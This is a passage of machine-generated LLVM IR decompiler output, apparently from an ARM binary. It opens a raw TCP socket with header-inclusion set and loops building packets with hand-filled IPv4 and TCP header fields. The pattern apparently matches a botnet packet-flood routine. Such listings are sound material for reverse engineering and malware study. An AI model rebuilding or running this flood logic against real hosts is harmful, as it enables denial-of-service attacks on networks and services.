  store i32 %v0_a408, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_a404, i32* @r8, align 4
  %v0_a418 = load i32, i32* @r4, align 4
  store i32 %v0_a418, i32* %r0.global-to-local, align 4
  %v4_a41c = inttoptr i32 %v0_a408 to i32*
  %v5_a41c = call i32 @function_92dc(i32 %v0_a418, i32* %v4_a41c, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a42c = load i32, i32* @r5, align 4
  store i32 %v0_a42c, i32* %r1.global-to-local, align 4
  %v0_a430 = load i32, i32* @r4, align 4
  store i32 %v0_a430, i32* %r0.global-to-local, align 4
  %v4_a434 = inttoptr i32 %v0_a42c to i32*
  %v5_a434 = call i32 @function_92dc(i32 %v0_a430, i32* %v4_a434, i32 1, i32 1)
  %v1_a43c = urem i32 %v5_a434, 256
  store i32 %v1_a43c, i32* %ip.global-to-local, align 4
  %v0_a440 = load i32, i32* @r5, align 4
  store i32 %v0_a440, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a44c = load i32, i32* @r4, align 4
  store i32 %v0_a44c, i32* %r0.global-to-local, align 4
  %v5_a454 = inttoptr i32 %v0_a440 to i32*
  %v6_a454 = call i32 @function_92dc(i32 %v0_a44c, i32* %v5_a454, i32 19, i32 0)
  %v0_a45c = load i32, i32* @r5, align 4
  store i32 %v0_a45c, i32* %r1.global-to-local, align 4
  %v2_a460 = load i32, i32* @global_var_1a420.104, align 4
  store i32 %v2_a460, i32* %r3.global-to-local, align 4
  store i32 %v6_a454, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_a46c = load i32, i32* @r4, align 4
  store i32 %v0_a46c, i32* %r0.global-to-local, align 4
  %v4_a470 = inttoptr i32 %v0_a45c to i32*
  %v5_a470 = call i32 @function_92dc(i32 %v0_a46c, i32* %v4_a470, i32 25, i32 %v2_a460)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a484 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_a484, i32* %r0.global-to-local, align 4
  %v2_a488 = icmp eq i32 %v3_a484, -1
  store i1 %v2_a488, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a488, label %dec_label_pc_a96c, label %dec_label_pc_a494

dec_label_pc_a494:                                ; preds = %dec_label_pc_a330
  store i32 1, i32* %stack_var_-40, align 4
  %v6_a49c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_a49c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_a4b0 = call i32 @setsockopt(i32 %v3_a484, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_a4b0, i32* %r0.global-to-local, align 4
  %v2_a4b4 = icmp eq i32 %v7_a4b0, -1
  store i1 %v2_a4b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a4b4, label %dec_label_pc_a964, label %dec_label_pc_a4bc

dec_label_pc_a4bc:                                ; preds = %dec_label_pc_a494
  %v0_a4bc = load i32, i32* @sl, align 4
  %v3_a4bc = mul i32 %v0_a4bc, 65536
  store i32 %v3_a4bc, i32* %sl.global-to-local, align 4
  %v0_a4c0 = load i32, i32* @r8, align 4
  %v3_a4c0 = mul i32 %v0_a4c0, 65536
  store i32 %v3_a4c0, i32* %r8.global-to-local, align 4
  %v0_a4c8 = load i32, i32* @r7, align 4
  %v3_a4c8 = mul i32 %v0_a4c8, 65536
  store i32 %v3_a4c8, i32* %r7.global-to-local, align 4
  %v0_a4cc = load i32, i32* @r6, align 4
  %v1_a4cc = urem i32 %v0_a4cc, 256
  store i32 %v1_a4cc, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v3_a4d4 = urem i32 %v0_a4c8, 65536
  store i32 %v3_a4d4, i32* %r2.global-to-local, align 4
  %v3_a4d8 = urem i32 %v0_a4bc, 65536
  store i32 %v3_a4d8, i32* %r3.global-to-local, align 4
  %v3_a4dc = urem i32 %v0_a4c0, 65536
  store i32 %v3_a4dc, i32* %r1.global-to-local, align 4
  %v0_a4e0 = load i32, i32* @fp, align 4
  %v2_a4e0 = icmp eq i32 %v0_a4e0, 0
  store i1 %v2_a4e0, i1* %cpsr_z.global-to-local, align 1
  %tmp86 = icmp slt i32 %v0_a4e0, 1
  br i1 %tmp86, label %dec_label_pc_aa8c, label %dec_label_pc_a500

dec_label_pc_a500:                                ; preds = %dec_label_pc_a4bc
  %v3_a504 = mul i32 %v5_a41c, 65536
  %v0_a4c8.not = or i32 %v0_a4c8, -65536
  %v1_a50c = xor i32 %v0_a4c8.not, 65535
  %v1_a514 = add i32 %v3_a504, 4325376
  %v1_a518 = urem i32 %v0_a4bc, 256
  %v3_a520 = udiv i32 %v1_a514, 256
  %v1_a524 = add i32 %v3_a504, 524288
  %v1_a52c = add i32 %v3_a504, 1835008
  %v1_a530 = urem i32 %v0_a4c0, 256
  %v1_a534 = and i32 %v3_a520, 65280
  store i32 %v1_a534, i32* %r0.global-to-local, align 4
  %v3_a53c = udiv i32 %v1_a52c, 256
  %tmp87 = mul nsw i32 %v1_a50c, 256
  %v1_a554 = and i32 %v3_a53c, 65280
  store i32 %v1_a554, i32* %ip.global-to-local, align 4
  %v1_a558 = and i32 %tmp87, 65280
  store i32 %v1_a558, i32* %lr.global-to-local, align 4
  %tmp89 = udiv i32 %v1_a50c, 256
  %v4_a544 = sdiv i32 %v1_a514, 16777216
  %v5_a574 = trunc i32 %tmp89 to i8
  %v3_a580 = mul nuw nsw i32 %v1_a518, 256
  %v3_a588 = ashr i32 %v1_a514, 31
  %v3_a58c = mul nuw nsw i32 %v1_a530, 256
  store i32 %v3_a58c, i32* %r5.global-to-local, align 4
  %tmp90 = udiv i32 %v0_a4bc, 256
  %v4_a590 = urem i32 %tmp90, 256
  %v5_a590 = or i32 %v4_a590, %v3_a580
  store i32 %v5_a590, i32* %r7.global-to-local, align 4
  %v3_a594 = udiv i32 %v1_a524, 256
  %tmp91 = udiv i32 %v0_a4c0, 256
  %v4_a598 = urem i32 %tmp91, 256
  %v5_a598 = or i32 %v4_a598, %v3_a58c
  store i32 %v5_a598, i32* %sl.global-to-local, align 4
  %v3_a5a4 = sdiv i32 %v3_a4c8, 16777216
  %v7_a5a4 = sdiv i32 %v1_a52c, 16777216
  %v1_a5a8 = and i32 %v3_a594, 65280
  store i32 %v1_a5a8, i32* %r6.global-to-local, align 4
  %v3_a5ac = ashr i32 %v3_a4c8, 31
  %v3_a5b0 = ashr i32 %v1_a52c, 31
  %v3_a5b4 = udiv i32 %v1_a50c, 65536
  %v4_a5b8 = udiv i32 %v1_a524, 16777216
  %v5_a5b8 = or i32 %v4_a5b8, %v1_a5a8
  store i32 %v5_a5b8, i32* %r8.global-to-local, align 4
  store i32 %v1_a518, i32* %r1.global-to-local, align 4
  store i32 %v1_a530, i32* %r2.global-to-local, align 4
  %v3_a5d038 = udiv i32 %v1_a5a8, 256
  store i32 %v3_a5d038, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v4_a630 = sext i8 %v5_a3c0 to i32
  %v2_a730 = icmp eq i32 %v1_a4cc, 0
  %sext18 = mul i32 %v0_a4bc, 16777216
  %v4_a744 = sdiv i32 %sext18, 16777216
  %sext19 = mul i32 %v1_a524, 256
  %v4_a758 = sdiv i32 %sext19, 16777216
  %sext20 = mul i32 %v0_a4c0, 16777216
  %v4_a760 = sdiv i32 %sext20, 16777216
  %v1_a644 = trunc i32 %v3_a588 to i8
  %v1_a768 = trunc i32 %v4_a758 to i8
  br label %dec_label_pc_a5e4

dec_label_pc_a5e4:                                ; preds = %bb98, %dec_label_pc_a500
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_a5f0 = call i32* @calloc(i32 1510, i32 4)
  %v4_a5f0 = ptrtoint i32* %v2_a5f0 to i32
  store i32 %v4_a5f0, i32* %r0.global-to-local, align 4
  store i32 %v4_a350, i32* %r1.global-to-local, align 4
  %v3_a5f8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a5f8, i32* %r3.global-to-local, align 4
  %v2_a5fc = load i32, i32* %r4.global-to-local, align 4
  %v5_a5fc = mul i32 %v2_a5fc, 4
  %v6_a5fc = add i32 %v5_a5fc, %v4_a350
  %v7_a5fc = inttoptr i32 %v6_a5fc to i32*
  store i32 %v4_a5f0, i32* %v7_a5fc, align 4
  %v0_a600 = load i32, i32* %r1.global-to-local, align 4
  %v1_a600 = load i32, i32* %r3.global-to-local, align 4
  %v4_a600 = mul i32 %v1_a600, 4
  %v5_a600 = add i32 %v4_a600, %v0_a600
  %v6_a600 = inttoptr i32 %v5_a600 to i32*
  %v7_a600 = load i32, i32* %v6_a600, align 4
  store i32 %v7_a600, i32* %r4.global-to-local, align 4
  %v1_a604 = inttoptr i32 %v7_a600 to i8*
  %v2_a604 = load i8, i8* %v1_a604, align 1
  %tmp = urem i8 %v2_a604, 16
  %v1_a608 = zext i8 %tmp to i32
  %v1_a60c = or i32 %v1_a608, 64
  store i32 %v1_a60c, i32* %r2.global-to-local, align 4
  %v1_a610 = trunc i32 %v1_a60c to i8
  store i8 %v1_a610, i8* %v1_a604, align 1
  %v0_a614 = load i32, i32* %r4.global-to-local, align 4
  %v1_a614 = inttoptr i32 %v0_a614 to i8*
  %v2_a614 = load i8, i8* %v1_a614, align 1
  %v1_a618 = and i8 %v2_a614, -16
  %v1_a61c = or i8 %v1_a618, 5
  store i32 %v1_a3d0, i32* %r2.global-to-local, align 4
  store i8 %v1_a61c, i8* %v1_a614, align 1
  %v2_a62c = load i32, i32* %r4.global-to-local, align 4
  %v3_a62c = add i32 %v2_a62c, 1
  %v4_a62c = inttoptr i32 %v3_a62c to i8*
  store i8 %v5_a388, i8* %v4_a62c, align 1
  store i32 %v4_a630, i32* %r1.global-to-local, align 4
  %v2_a634 = load i32, i32* %r4.global-to-local, align 4
  %v3_a634 = add i32 %v2_a634, 8
  %v4_a634 = inttoptr i32 %v3_a634 to i8*
  store i8 %v5_a3c0, i8* %v4_a634, align 1
  store i32 %v3_a588, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_a640 = load i32, i32* %r2.global-to-local, align 4
  %v9_a640 = icmp eq i32 %v0_a640, 0
  store i1 %v9_a640, i1* %cpsr_z.global-to-local, align 1
  %v2_a644 = load i32, i32* %r4.global-to-local, align 4
  %v3_a644 = add i32 %v2_a644, 3
  %v4_a644 = inttoptr i32 %v3_a644 to i8*
  store i8 %v1_a644, i8* %v4_a644, align 1
  store i32 %v4_a544, i32* %r2.global-to-local, align 4
  %v0_a64c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a64c, label %.thread22, label %.thread

.thread:                                          ; preds = %dec_label_pc_a5e4
  %v1_a64c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_a64c, i32* %r3.global-to-local, align 4
  %v2_a650 = trunc i32 %v1_a64c to i8
  %v3_a650 = load i32, i32* %r4.global-to-local, align 4
  %v4_a650 = add i32 %v3_a650, 7
  %v5_a650 = inttoptr i32 %v4_a650 to i8*
  store i8 %v2_a650, i8* %v5_a650, align 1
  %v0_a654.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a654.pr.pr, label %.thread22, label %bb

bb:                                               ; preds = %.thread
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_a658 = load i32, i32* %r4.global-to-local, align 4
  %v4_a658 = add i32 %v3_a658, 6
  %v5_a658 = inttoptr i32 %v4_a658 to i8*
  store i8 64, i8* %v5_a658, align 1
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_a5e4, %.thread, %bb
  %v0_a65c = load i32, i32* %r2.global-to-local, align 4
  %v1_a65c = trunc i32 %v0_a65c to i8
  %v2_a65c = load i32, i32* %r4.global-to-local, align 4
  %v3_a65c = add i32 %v2_a65c, 2
  %v4_a65c = inttoptr i32 %v3_a65c to i8*
  store i8 %v1_a65c, i8* %v4_a65c, align 1
  store i32 %v3_a5ac, i32* %r2.global-to-local, align 4
  store i32 %v3_a5a4, i32* %r1.global-to-local, align 4
  %v2_a66c = load i32, i32* %r4.global-to-local, align 4
  %v3_a66c = add i32 %v2_a66c, 9
  %v4_a66c = inttoptr i32 %v3_a66c to i8*
  store i8 47, i8* %v4_a66c, align 1
  %v0_a670 = load i32, i32* %r2.global-to-local, align 4
  %v1_a670 = trunc i32 %v0_a670 to i8
  %v2_a670 = load i32, i32* %r4.global-to-local, align 4
  %v3_a670 = add i32 %v2_a670, 5
  %v4_a670 = inttoptr i32 %v3_a670 to i8*
  store i8 %v1_a670, i8* %v4_a670, align 1
  %v3_a674 = load i32, i32* %stack_var_-40, align 4
  %v5_a67c = mul i32 %v3_a674, 24
  store i32 %v5_a67c, i32* %r3.global-to-local, align 4
  store i32 %v5_a470, i32* %r2.global-to-local, align 4
  %v1_a684 = load i32, i32* %r4.global-to-local, align 4
  %v2_a684 = add i32 %v1_a684, 12
  %v3_a684 = inttoptr i32 %v2_a684 to i32*
  store i32 %v5_a470, i32* %v3_a684, align 4
  %v0_a688 = load i32, i32* %r3.global-to-local, align 4
  %v1_a688 = load i32, i32* @sb, align 4
  %v2_a688 = add i32 %v1_a688, %v0_a688
  store i32 %v2_a688, i32* %r3.global-to-local, align 4
  %v1_a68c = add i32 %v2_a688, 16
  %v2_a68c = inttoptr i32 %v1_a68c to i32*
  %v3_a68c = load i32, i32* %v2_a68c, align 4
  store i32 %v3_a68c, i32* %r2.global-to-local, align 4
  %v0_a690 = load i32, i32* %r1.global-to-local, align 4
  %v1_a690 = trunc i32 %v0_a690 to i8
  %v2_a690 = load i32, i32* %r4.global-to-local, align 4
  %v3_a690 = add i32 %v2_a690, 4
  %v4_a690 = inttoptr i32 %v3_a690 to i8*
  store i8 %v1_a690, i8* %v4_a690, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v0_a698 = load i32, i32* %r4.global-to-local, align 4
  %v1_a698 = add i32 %v0_a698, 20
  store i32 %v1_a698, i32* %r1.global-to-local, align 4
  %v3_a69c = add i32 %v0_a698, 22
  %v4_a69c = inttoptr i32 %v3_a69c to i8*
  store i8 101, i8* %v4_a69c, align 1
  %v0_a6a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a6a0 = load i32, i32* %r4.global-to-local, align 4
  %v2_a6a0 = add i32 %v1_a6a0, 16
  %v3_a6a0 = inttoptr i32 %v2_a6a0 to i32*
  store i32 %v0_a6a0, i32* %v3_a6a0, align 4
  %v0_a6a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_a6a4 = add i32 %v0_a6a4, 24
  store i32 %v1_a6a4, i32* %r0.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v0_a6ac = load i32, i32* %r3.global-to-local, align 4
  %v1_a6ac = add i32 %v0_a6ac, -93
  store i32 %v1_a6ac, i32* %r3.global-to-local, align 4
  %v2_a6b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a6b0 = add i32 %v2_a6b0, 3
  %v4_a6b0 = inttoptr i32 %v3_a6b0 to i8*
  store i8 88, i8* %v4_a6b0, align 1
  %v0_a6b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a6b4 = trunc i32 %v0_a6b4 to i8
  %v2_a6b4 = load i32, i32* %r0.global-to-local, align 4
  %v3_a6b4 = add i32 %v2_a6b4, 12
  %v4_a6b4 = inttoptr i32 %v3_a6b4 to i8*
  store i8 %v1_a6b4, i8* %v4_a6b4, align 1
  %v0_a6b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_a6b8 = trunc i32 %v0_a6b8 to i8
  %v2_a6b8 = load i32, i32* %r0.global-to-local, align 4
  %v3_a6b8 = add i32 %v2_a6b8, 13
  %v4_a6b8 = inttoptr i32 %v3_a6b8 to i8*
  store i8 %v1_a6b8, i8* %v4_a6b8, align 1
  %v0_a6bc = load i32, i32* %r4.global-to-local, align 4
  %v1_a6bc = add i32 %v0_a6bc, 38
  %v2_a6bc = inttoptr i32 %v1_a6bc to i8*
  %v3_a6bc = load i8, i8* %v2_a6bc, align 1
  %tmp103 = urem i8 %v3_a6bc, 16
  %v1_a6c0 = zext i8 %tmp103 to i32
  %v1_a6c4 = or i32 %v1_a6c0, 64
  store i32 %v1_a6c4, i32* %r3.global-to-local, align 4
  %v1_a6c8 = trunc i32 %v1_a6c4 to i8
  store i8 %v1_a6c8, i8* %v2_a6bc, align 1
  %v0_a6cc = load i32, i32* %r4.global-to-local, align 4
  %v1_a6cc = add i32 %v0_a6cc, 38
  %v2_a6cc = inttoptr i32 %v1_a6cc to i8*
  %v3_a6cc = load i8, i8* %v2_a6cc, align 1
  %v1_a6d0 = and i8 %v3_a6cc, -16
  %v1_a6d4 = or i8 %v1_a6d0, 5
  store i8 %v1_a6d4, i8* %v2_a6cc, align 1
  %v0_a6e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_a6e0 = add i32 %v0_a6e0, 38
  store i32 %v1_a6e0, i32* %r5.global-to-local, align 4
  %v3_a6e4 = add i32 %v0_a6e0, 39
  %v4_a6e4 = inttoptr i32 %v3_a6e4 to i8*
  store i8 %v5_a388, i8* %v4_a6e4, align 1
  store i32 %v7_a5a4, i32* %r1.global-to-local, align 4
  store i32 %tmp89, i32* %r3.global-to-local, align 4
  store i32 %v3_a5b0, i32* %r2.global-to-local, align 4
  %v2_a6f4 = load i32, i32* %r5.global-to-local, align 4
  %v3_a6f4 = add i32 %v2_a6f4, 4
  %v4_a6f4 = inttoptr i32 %v3_a6f4 to i8*
  store i8 %v5_a574, i8* %v4_a6f4, align 1
  %v0_a6f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a6f8 = trunc i32 %v0_a6f8 to i8
  %v2_a6f8 = load i32, i32* %r5.global-to-local, align 4
  %v3_a6f8 = add i32 %v2_a6f8, 2
  %v4_a6f8 = inttoptr i32 %v3_a6f8 to i8*
  store i8 %v1_a6f8, i8* %v4_a6f8, align 1
  %v0_a6fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a6fc, label %bb93, label %bb92

bb92:                                             ; preds = %.thread22
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb93

bb93:                                             ; preds = %.thread22, %bb92
  store i32 %v3_a5b4, i32* %r1.global-to-local, align 4
  %v0_a704 = load i32, i32* %r2.global-to-local, align 4
  %v1_a704 = trunc i32 %v0_a704 to i8
  %v2_a704 = load i32, i32* %r5.global-to-local, align 4
  %v3_a704 = add i32 %v2_a704, 3
  %v4_a704 = inttoptr i32 %v3_a704 to i8*
  store i8 %v1_a704, i8* %v4_a704, align 1
  store i32 %v4_a630, i32* %r2.global-to-local, align 4
  %v0_a70c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a70c, label %bb95, label %bb94

bb94:                                             ; preds = %bb93
  %v1_a70c = load i32, i32* %r3.global-to-local, align 4
  %v2_a70c = trunc i32 %v1_a70c to i8
  %v3_a70c = load i32, i32* %r5.global-to-local, align 4
  %v4_a70c = add i32 %v3_a70c, 6
  %v5_a70c = inttoptr i32 %v4_a70c to i8*
  store i8 %v2_a70c, i8* %v5_a70c, align 1
  br label %bb95

bb95:                                             ; preds = %bb93, %bb94
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_a714 = load i32, i32* %r1.global-to-local, align 4
  %v1_a714 = trunc i32 %v0_a714 to i8
  %v2_a714 = load i32, i32* %r5.global-to-local, align 4
  %v3_a714 = add i32 %v2_a714, 5
  %v4_a714 = inttoptr i32 %v3_a714 to i8*
  store i8 %v1_a714, i8* %v4_a714, align 1
  %v0_a718 = load i32, i32* %r2.global-to-local, align 4
  %v1_a718 = trunc i32 %v0_a718 to i8
  %v2_a718 = load i32, i32* %r5.global-to-local, align 4
  %v3_a718 = add i32 %v2_a718, 8
  %v4_a718 = inttoptr i32 %v3_a718 to i8*
  store i8 %v1_a718, i8* %v4_a718, align 1
  %v0_a71c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a71c, label %bb97, label %bb96

bb96:                                             ; preds = %bb95
  %v1_a71c = load i32, i32* %ip.global-to-local, align 4
  %v2_a71c = trunc i32 %v1_a71c to i8
  %v3_a71c = load i32, i32* %r5.global-to-local, align 4
  %v4_a71c = add i32 %v3_a71c, 7
  %v5_a71c = inttoptr i32 %v4_a71c to i8*
  store i8 %v2_a71c, i8* %v5_a71c, align 1
  br label %bb97

bb97:                                             ; preds = %bb95, %bb96
  %v0_a720 = load i32, i32* %r3.global-to-local, align 4
  %v1_a720 = trunc i32 %v0_a720 to i8
  %v2_a720 = load i32, i32* %r5.global-to-local, align 4
  %v3_a720 = add i32 %v2_a720, 9
  %v4_a720 = inttoptr i32 %v3_a720 to i8*
  store i8 %v1_a720, i8* %v4_a720, align 1
  %v0_a724 = call i32 @function_f67c()
  store i32 %v0_a724, i32* %r0.global-to-local, align 4
  store i32 %v1_a4cc, i32* %r1.global-to-local, align 4
  store i1 %v2_a730, i1* %cpsr_z.global-to-local, align 1
  %v1_a734 = sub i32 1023, %v0_a724
  store i32 %v1_a734, i32* %r3.global-to-local, align 4
  br i1 %v2_a730, label %.thread23, label %.thread24

.thread23:                                        ; preds = %bb97
  %v2_a73c = load i32, i32* %r5.global-to-local, align 4
  %v3_a73c = add i32 %v2_a73c, 16
  %v4_a73c = inttoptr i32 %v3_a73c to i32*
  store i32 %v1_a734, i32* %v4_a73c, align 4
  br label %bb98

.thread24:                                        ; preds = %bb97
  %v1_a738 = load i32, i32* %r4.global-to-local, align 4
  %v2_a738 = add i32 %v1_a738, 16
  %v3_a738 = inttoptr i32 %v2_a738 to i32*
  %v4_a738 = load i32, i32* %v3_a738, align 4
  store i32 %v4_a738, i32* %r3.global-to-local, align 4
  %v2_a740 = load i32, i32* %r5.global-to-local, align 4
  %v3_a740 = add i32 %v2_a740, 16
  %v4_a740 = inttoptr i32 %v3_a740 to i32*
  store i32 %v4_a738, i32* %v4_a740, align 4
  br label %bb98

bb98:                                             ; preds = %.thread23, %.thread24
  store i32 %v4_a744, i32* %r3.global-to-local, align 4
  %v0_a748 = load i32, i32* %r4.global-to-local, align 4
  %v1_a748 = add i32 %v0_a748, 58
  store i32 %v1_a748, i32* %r6.global-to-local, align 4
  %v1_a74c = load i32, i32* %r5.global-to-local, align 4
  %v2_a74c = add i32 %v1_a74c, 12
  %v3_a74c = inttoptr i32 %v2_a74c to i32*
  store i32 %v0_a724, i32* %v3_a74c, align 4
  %v0_a750 = load i32, i32* %r3.global-to-local, align 4
  %v1_a750 = trunc i32 %v0_a750 to i8
  %v2_a750 = load i32, i32* %r6.global-to-local, align 4
  %v3_a750 = add i32 %v2_a750, 1
  %v4_a750 = inttoptr i32 %v3_a750 to i8*
  store i8 %v1_a750, i8* %v4_a750, align 1
  %v3_a754 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a754, i32* %r3.global-to-local, align 4
  store i32 %v4_a758, i32* %r2.global-to-local, align 4
  %v1_a75c = add i32 %v3_a754, 1
  store i32 %v1_a75c, i32* %r4.global-to-local, align 4
  store i32 %v4_a760, i32* %r1.global-to-local, align 4
  %v1_a764 = load i32, i32* @fp, align 4
  %v9_a764 = icmp eq i32 %v1_a75c, %v1_a764
  store i1 %v9_a764, i1* %cpsr_z.global-to-local, align 1
  %v2_a768 = load i32, i32* %r6.global-to-local, align 4
  %v3_a768 = add i32 %v2_a768, 5
  %v4_a768 = inttoptr i32 %v3_a768 to i8*
  store i8 %v1_a768, i8* %v4_a768, align 1
  %v0_a76c = load i32, i32* %r7.global-to-local, align 4
  %v1_a76c = trunc i32 %v0_a76c to i8
  %v2_a76c = load i32, i32* %r6.global-to-local, align 4
  %v3_a76c = inttoptr i32 %v2_a76c to i8*
  store i8 %v1_a76c, i8* %v3_a76c, align 1
  %v0_a770 = load i32, i32* %sl.global-to-local, align 4
  %v1_a770 = trunc i32 %v0_a770 to i8
  %v2_a770 = load i32, i32* %r6.global-to-local, align 4
  %v3_a770 = add i32 %v2_a770, 2
  %v4_a770 = inttoptr i32 %v3_a770 to i8*
  store i8 %v1_a770, i8* %v4_a770, align 1
  %v0_a774 = load i32, i32* %r1.global-to-local, align 4
  %v1_a774 = trunc i32 %v0_a774 to i8
  %v2_a774 = load i32, i32* %r6.global-to-local, align 4
  %v3_a774 = add i32 %v2_a774, 3
  %v4_a774 = inttoptr i32 %v3_a774 to i8*
  store i8 %v1_a774, i8* %v4_a774, align 1
  %v0_a778 = load i32, i32* %r8.global-to-local, align 4
  %v1_a778 = trunc i32 %v0_a778 to i8
  %v2_a778 = load i32, i32* %r6.global-to-local, align 4
  %v3_a778 = add i32 %v2_a778, 4
  %v4_a778 = inttoptr i32 %v3_a778 to i8*
  store i8 %v1_a778, i8* %v4_a778, align 1
  %v0_a77c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_a77c, i32* %stack_var_-40, align 4
  %v5_a780 = icmp slt i32 %v1_a75c, %v1_a764
  br i1 %v5_a780, label %dec_label_pc_a5e4, label %dec_label_pc_a784

dec_label_pc_a784:                                ; preds = %bb98
  %v1_a78c = add i32 %v5_a41c, 8
  store i32 %v1_a78c, i32* %r2.global-to-local, align 4
  %v1_a790 = add i32 %v5_a41c, 66
  store i32 %v1_a790, i32* %r3.global-to-local, align 4
  %v0_a79c.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_a79c.preheader

dec_label_pc_a79c.preheader:                      ; preds = %dec_label_pc_a784, %dec_label_pc_aa8c
  %v0_a79c.pre = phi i32 [ %v0_a79c.pre.pre, %dec_label_pc_a784 ], [ %v0_a4e0, %dec_label_pc_aa8c ]
  %stack_var_-160.0.ph = phi i32 [ %v1_a790, %dec_label_pc_a784 ], [ %v1_aa98, %dec_label_pc_aa8c ]
  %stack_var_-156.0.ph = phi i32 [ %v1_a78c, %dec_label_pc_a784 ], [ %v1_aa94, %dec_label_pc_aa8c ]
  %v9_a9ec = icmp eq i32 %v3_a4d4, add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1)
  %v2_aa5c = icmp eq i32 %v1_a4cc, 0
  %v2_a840 = ptrtoint i32* %stack_var_-44 to i32
  %v2_a858 = ptrtoint i32* %stack_var_-48 to i32
  %v2_a868 = ptrtoint i32* %stack_var_-52 to i32
  %v2_a874 = ptrtoint i32* %stack_var_-50 to i32
  %v2_a888 = icmp eq i32 %v1_a43c, 0
  %v2_a7e4 = icmp eq i32 %v5_a470, -1
  br label %dec_label_pc_a79c

dec_label_pc_a79c:                                ; preds = %dec_label_pc_a890, %dec_label_pc_a79c.preheader
  %v0_a79c = phi i32 [ %v0_a79c.pre, %dec_label_pc_a79c.preheader ], [ %v1_a954, %dec_label_pc_a890 ]
  %v2_a79c = icmp eq i32 %v0_a79c, 0
  store i1 %v2_a79c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp99 = icmp slt i32 %v0_a79c, 1
  br label %dec_label_pc_a7a4

dec_label_pc_a7a4:                                ; preds = %dec_label_pc_a7a4, %dec_label_pc_a79c
  br i1 %tmp99, label %dec_label_pc_a7a4, label %dec_label_pc_a7a8

dec_label_pc_a7a8:                                ; preds = %dec_label_pc_a7a4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  br label %dec_label_pc_a7b4

dec_label_pc_a7b4:                                ; preds = %dec_label_pc_a890, %dec_label_pc_a7a8
  %v1_a7c8 = phi i32 [ %v1_a950, %dec_label_pc_a890 ], [ 0, %dec_label_pc_a7a8 ]
  %v5_a7b8 = mul i32 %v1_a7c8, 24
  %v1_a7bc = load i32, i32* @sb, align 4
  %v2_a7bc = add i32 %v1_a7bc, %v5_a7b8
  store i32 %v2_a7bc, i32* %r3.global-to-local, align 4
  store i32 %v4_a350, i32* %r1.global-to-local, align 4
  %v1_a7c4 = add i32 %v2_a7bc, 20
  %v2_a7c4 = inttoptr i32 %v1_a7c4 to i8*
  %v3_a7c4 = load i8, i8* %v2_a7c4, align 1
  %v4_a7c4 = zext i8 %v3_a7c4 to i32
  store i32 %v4_a7c4, i32* %r2.global-to-local, align 4
  %v4_a7c8 = mul i32 %v1_a7c8, 4
  %v5_a7c8 = add i32 %v4_a7c8, %v4_a350
  %v6_a7c8 = inttoptr i32 %v5_a7c8 to i32*
  %v7_a7c8 = load i32, i32* %v6_a7c8, align 4
  store i32 %v7_a7c8, i32* @r5, align 4
  %v7_a7cc = icmp eq i8 %v3_a7c4, 31
  store i1 %v7_a7cc, i1* %cpsr_z.global-to-local, align 1
  %v1_a7d0 = add i32 %v7_a7c8, 24
  store i32 %v1_a7d0, i32* @r8, align 4
  %v1_a7d4 = add i32 %v7_a7c8, 38
  store i32 %v1_a7d4, i32* @r6, align 4
  %v1_a7d8 = add i32 %v7_a7c8, 58
  store i32 %v1_a7d8, i32* @r7, align 4
  %tmp104 = icmp ult i8 %v3_a7c4, 32
  br i1 %tmp104, label %dec_label_pc_a974, label %dec_label_pc_a7e0

dec_label_pc_a7e0:                                ; preds = %dec_label_pc_a7b4
  store i32 %v5_a470, i32* %r2.global-to-local, align 4
  store i1 %v2_a7e4, i1* %cpsr_z.global-to-local, align 1
